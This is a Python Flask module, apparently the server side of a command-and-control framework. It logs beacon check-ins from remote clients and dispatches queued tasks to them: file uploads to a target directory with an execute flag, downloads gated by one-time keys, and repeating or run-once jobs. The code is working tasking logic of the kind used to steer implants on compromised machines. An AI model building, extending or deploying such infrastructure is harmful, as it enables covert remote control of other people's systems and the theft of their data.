from server import db
from server.models import Task, User
from datetime import datetime, timedelta
from sqlalchemy import or_
from flask import send_file
from server.task_modes import TaskMode
import os
import uuid

class BeaconService():
    one_time_keys = {}
    
    def __init__(self):
        pass
    
    def handle_beacon_request(self, client_id):
        user = User.query.filter_by(client_id=client_id).first()
        
        if user:
            user.last_beacon_signal = datetime.utcnow()
            print(f"[+] Updated last_beacon_signal for client_id: {client_id}") # Debugging purposes
            db.session.commit()
        else:
            # TODO: Implement emergency mechanism when client_id not found in User table
            print(f"[!] Client ID: {client_id} not found in User table.") # Debugging purposes
            return {}
            
        tasks = Task.query.filter(
            Task.client_id == client_id,
            or_(Task.next_execution == None, Task.next_execution <= datetime.utcnow())
        ).all()
        
        task_commands = []
        
        for task in tasks:
            target_dir = ""
            execute = False
            one_time_key = None
            
            if task.command_mode == TaskMode.FILE_UPLOAD.value:
                target_dir = r"path_to_directory\to_write_to"
                execute = False
            elif task.command_mode == TaskMode.FILE_DOWNLOAD.value:
                one_time_key = str(uuid.uuid4())
                self.one_time_keys[client_id] = one_time_key

            task_commands.append({
                "mode": task.command_mode,
                "resource": task.command,
                "target_dir": target_dir,
                "execute": execute,
                "fdl_key": one_time_key
            })
            
            if task.repeat_interval:
                task.next_execution = datetime.utcnow() + timedelta(seconds=task.repeat_interval)
            
            if task.run_once:
                db.session.delete(task)
            else:
                db.session.add(task)
        
        db.session.commit()

        return task_commands
    
    @classmethod
    def verify_otk(cls, client_id, key):
        if client_id in cls.one_time_keys and cls.one_time_keys[client_id] == key:
            del cls.one_time_keys[client_id]
            return True
        return False